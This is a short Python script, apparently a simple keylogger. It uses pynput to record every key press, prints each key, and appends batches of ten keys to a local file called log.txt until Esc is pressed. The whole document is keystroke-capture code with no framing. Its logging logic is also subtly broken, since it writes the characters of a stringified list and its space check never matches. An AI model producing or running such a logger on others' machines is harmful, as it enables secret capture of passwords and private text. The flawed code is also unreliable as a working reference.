import pynput
from pynput.keyboard import Key, Listener
count = 0
keys = []


def pressOwnFunction(key):
    global keys, count
    keys.append(key)
    count += 1

    if count >= 10:
        count = 0
        write_file(str(keys))
        keys = []
    print("{0} PRESSED".format(key))


def write_file(keys):
    with open("log.txt", 'a') as f:
        for key in keys:
            k=str(key).replace("'","")
            if k.find("Key.space") >0:
                f.write('\n')
            elif k.find("Key")==-1:
                f.write(k)
                    


def releaseOwnFunction(key):
    if key == Key.esc:
        return False


with Listener(on_press=pressOwnFunction, on_release=releaseOwnFunction) as listener:
    listener.join()
